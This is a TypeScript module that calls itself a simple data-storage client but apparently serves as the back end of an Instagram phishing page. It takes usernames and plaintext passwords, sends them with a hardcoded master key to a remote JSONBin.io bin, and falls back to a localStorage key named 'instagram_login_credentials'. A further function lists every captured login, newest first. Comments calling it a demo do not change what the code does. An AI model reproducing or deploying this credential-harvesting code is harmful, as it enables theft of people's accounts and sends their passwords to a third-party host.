
// This file implements a simple API client for storing data
// In a production environment, this would connect to a proper secured backend

export interface Credential {
  _id: string;
  username: string;
  password: string;
  timestamp: string;
}

// A simple shared data service using JSONBin.io
// This is for DEMO purposes only - in a real app, you should NEVER
// store credentials like this and should use a proper backend with authentication
class RemoteDataService {
  private readonly API_KEY = "$2a$10$UWOgLCQw7kGfdwNbDqF7NOJW8zMqR0EYcdspYQttdcRlfYJePJPQS"; // Public demo key (don't use in production)
  private readonly BIN_ID = "65e7ed88266cfc3fde931b89"; // Public bin for demo
  private readonly API_URL = "https://api.jsonbin.io/v3/b";
  
  async storeCredential(username: string, password: string): Promise<{ success: boolean, id: string }> {
    try {
      // First, get existing data
      const existingData = await this.getCredentials();
      
      // Create a new credential document
      const newCredential: Credential = {
        _id: crypto.randomUUID(), // Generate a random ID
        username,
        password,
        timestamp: new Date().toISOString()
      };
      
      // Add to existing credentials
      const updatedData = [...existingData, newCredential];
      
      // Store to JSONBin
      const response = await fetch(`${this.API_URL}/${this.BIN_ID}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'X-Master-Key': this.API_KEY
        },
        body: JSON.stringify(updatedData)
      });
      
      if (!response.ok) {
        console.error('Failed to store data to remote service', await response.text());
        throw new Error('Failed to store data to remote service');
      }
      
      console.log('Successfully stored credential to remote service');
      return { success: true, id: newCredential._id };
    } catch (error) {
      console.error("Failed to store login credential:", error);
      return { success: false, id: '' };
    }
  }
  
  async getCredentials(): Promise<Credential[]> {
    try {
      console.log('Fetching credentials from remote service');
      // Get data from JSONBin
      const response = await fetch(`${this.API_URL}/${this.BIN_ID}`, {
        method: 'GET',
        headers: {
          'X-Master-Key': this.API_KEY
        }
      });
      
      if (!response.ok) {
        console.error('Failed to fetch data from remote service', await response.text());
        throw new Error('Failed to fetch data from remote service');
      }
      
      const data = await response.json();
      console.log('Received data from remote service:', data);
      
      // Ensure we're returning an array of credentials
      if (data && data.record && Array.isArray(data.record)) {
        return data.record;
      } else {
        console.warn('Remote service returned invalid data format, returning empty array');
        return [];
      }
    } catch (error) {
      console.error("Failed to retrieve credentials:", error);
      
      // Fall back to empty array if the fetch fails
      return [];
    }
  }
}

// Create a singleton instance
const remoteDataService = new RemoteDataService();

export async function storeLoginCredential(username: string, password: string) {
  console.log('Attempting to store credential:', { username });
  // Add a fallback to localStorage if the remote service fails
  try {
    const result = await remoteDataService.storeCredential(username, password);
    console.log('Credential storage result:', result);
    return result;
  } catch (error) {
    console.error("Remote storage failed, falling back to localStorage:", error);
    
    // Get existing credentials from localStorage
    const existingCredentials = getLocalCredentials();
    
    // Create a new credential document
    const newCredential: Credential = {
      _id: crypto.randomUUID(),
      username,
      password,
      timestamp: new Date().toISOString()
    };
    
    // Add to existing credentials
    existingCredentials.push(newCredential);
    
    // Save back to localStorage
    localStorage.setItem('instagram_login_credentials', JSON.stringify(existingCredentials));
    
    return { success: true, id: newCredential._id };
  }
}

export async function getLoginCredentials() {
  console.log('Retrieving login credentials');
  try {
    // Try to get from remote service first
    const credentials = await remoteDataService.getCredentials();
    console.log('Retrieved credentials from remote service:', credentials);
    
    // Sort by timestamp in descending order (newest first)
    credentials.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
    
    return { success: true, data: credentials };
  } catch (error) {
    console.error("Remote fetch failed, falling back to localStorage:", error);
    
    // Fall back to localStorage if the remote service fails
    const localCredentials = getLocalCredentials();
    
    // Sort by timestamp in descending order (newest first)
    localCredentials.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
    
    return { success: true, data: localCredentials };
  }
}

// Helper function to get credentials from localStorage
function getLocalCredentials(): Credential[] {
  try {
    const storedData = localStorage.getItem('instagram_login_credentials');
    if (!storedData) return [];
    return JSON.parse(storedData) as Credential[];
  } catch (error) {
    console.error("Failed to retrieve local credentials:", error);
    return [];
  }
}
